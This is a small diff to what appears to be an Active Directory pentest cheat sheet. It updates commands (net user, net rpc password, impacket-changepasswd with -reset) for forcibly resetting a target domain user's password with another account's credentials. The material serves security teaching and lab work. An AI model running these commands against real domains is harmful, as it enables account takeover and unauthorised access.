@@ -4,12 +4,12 @@
 
 #### 1) Net (Windows)
 
-    net user USER PASSWORD /domain (Windows)
+    net user TARGET_USER PASSWORD /domain (Windows)
 
 #### 2) Net (Linux)
 
-    net rpc password USER PASSWORD -S DC_FQDN (Linux)
-
+    net rpc password TARGET_USER PASSWORD -S DC_FQDN -U domain.local/USER1%'Password@1'
+    
 #### 3) Impacket
 
     impacket-changepasswd ignite.local/USER1@DC_IP -newpass Password@1234 -altuser ignite.local/TARGET_USER -altpass Password@1 -reset
